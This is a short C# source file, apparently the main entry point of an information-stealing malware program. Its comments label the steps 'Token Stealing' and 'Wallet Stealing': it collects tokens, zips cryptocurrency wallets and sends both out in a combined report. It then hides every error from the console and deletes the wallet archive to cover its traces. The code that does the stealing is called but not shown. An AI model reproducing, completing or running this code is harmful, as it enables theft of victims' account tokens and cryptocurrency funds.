using System;
using System.Collections.Generic; // Required for List<string>
using System.Threading.Tasks; // Required for Task
using System.IO; // Required for File.Delete
using H.DV;
using DataHarvester;

namespace OdPS
{
    internal class Program
    {
        // Main method is the entry point of the application.
        // It's marked as async to properly await the asynchronous operations.
        static async Task Main(string[] args)
        {
            string walletZipPath = null;

            try
            {
                // Token Stealing
                var stolenTokens = TX.GetTokens();

                // Wallet Stealing
                walletZipPath = await K.B();

                // Send Combined Report
                await ReportSender.SendCombinedReport(stolenTokens, walletZipPath);
            }
            catch
            {
                // Errores ignorados para evitar mensajes en consola
            }
            finally
            {
                // Cleanup
                if (!string.IsNullOrEmpty(walletZipPath) && File.Exists(walletZipPath))
                {
                    try
                    {
                        File.Delete(walletZipPath);
                    }
                    catch { }
                }
            }
        }

    }
}
